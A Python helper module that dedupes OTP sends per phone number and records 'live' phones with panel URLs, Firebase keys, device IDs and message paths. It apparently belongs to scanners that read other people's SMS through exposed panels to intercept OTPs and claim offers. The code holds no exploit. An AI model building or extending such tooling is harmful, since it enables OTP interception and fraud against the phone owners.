"""
otp_shared.py — Shared OTP Deduplication Lock
==============================================
Prevents multiple threads from sending OTP to the same phone number simultaneously.
Import this in jio_gemini_scanner.py and stream_scanner.py.
"""
from __future__ import annotations
import threading
import time
from typing import Callable, Any

from pathlib import Path

__all__ = [
    "claim_with_lock", "is_locked", "lock_count",
    "async_claim_with_lock", "async_release_lock",
    "register_live_phone", "async_register_live_phone"
]

_otp_locks: dict[str, threading.Event] = {}
_lock_meta = threading.Lock()


def claim_with_lock(phone: str, callback: Callable[[], Any], timeout: float = 120.0) -> Any:
    """
    Acquire a per-phone lock, run callback, release.
    If the phone is already being processed, returns None immediately.
    callback should be your full OTP+claim flow.
    """
    with _lock_meta:
        if phone in _otp_locks:
            return None  # already in flight — skip
        evt = threading.Event()
        _otp_locks[phone] = evt

    try:
        return callback()
    finally:
        with _lock_meta:
            _otp_locks.pop(phone, None)
        evt.set()


def is_locked(phone: str) -> bool:
    with _lock_meta:
        return phone in _otp_locks


def lock_count() -> int:
    with _lock_meta:
        return len(_otp_locks)


# ==================== ASYNC VERSION ====================
# For beast_engine.py (fully async, no threading)
import asyncio as _asyncio

_async_otp_locks: set[str] = set()
_async_lock = _asyncio.Lock()


async def async_claim_with_lock(phone: str) -> bool:
    """
    Async version: acquire a per-phone lock.
    Returns True if lock acquired (caller should proceed), False if already locked.
    Call async_release_lock(phone) when done.
    """
    async with _async_lock:
        if phone in _async_otp_locks:
            return False
        _async_otp_locks.add(phone)
        return True


async def async_release_lock(phone: str) -> None:
    """Release the async per-phone lock."""
    async with _async_lock:
        _async_otp_locks.discard(phone)


# ==================== LIVE PHONE INVENTORY REGISTRATION ====================
LIVE_PHONES_FILE = Path("live_phones.txt")
_inv_lock = threading.Lock()
_registered_phones_cache: set[str] = set()
_cache_initialized: bool = False

def _init_cache_if_needed():
    global _cache_initialized
    if not _cache_initialized:
        if LIVE_PHONES_FILE.exists():
            try:
                for line in LIVE_PHONES_FILE.read_text(encoding="utf-8-sig", errors="ignore").splitlines():
                    line = line.strip()
                    if line and not line.startswith("#"):
                        _registered_phones_cache.add(line.split("|")[0].strip())
            except Exception:
                pass
        _cache_initialized = True

def register_live_phone(
    mobile: str,
    panel_url: str,
    firebase_key: str,
    device_id: str,
    panel_name: str = "",
    verified_path: str = "",
) -> bool:
    """
    Safely append a verified, working phone to live_phones.txt so otp_web can display it.
    Uses in-memory cache for O(1) deduplication without reading disk on every hit.
    Returns True if newly added, False if already present.
    """
    if not mobile or not panel_url:
        return False
    clean_mob = str(mobile).strip().lstrip("+")
    with _inv_lock:
        _init_cache_if_needed()
        if clean_mob in _registered_phones_cache:
            return False

        if not panel_name:
            panel_name = panel_url.split("//")[-1].split(".")[0]
        if not verified_path and device_id:
            verified_path = f"clients/{device_id}/messages"

        entry = f"{clean_mob}|{panel_url.rstrip('/')}|{firebase_key}|{device_id}|{panel_name}|verified|{verified_path}\n"
        try:
            with LIVE_PHONES_FILE.open("a", encoding="utf-8") as f:
                f.write(entry)
            _registered_phones_cache.add(clean_mob)
            return True
        except Exception:
            return False


async def async_register_live_phone(
    mobile: str,
    panel_url: str,
    firebase_key: str,
    device_id: str,
    panel_name: str = "",
    verified_path: str = "",
) -> bool:
    """Non-blocking async wrapper that prevents file I/O from stalling the event loop."""
    return await _asyncio.to_thread(
        register_live_phone,
        mobile, panel_url, firebase_key, device_id, panel_name, verified_path
    )

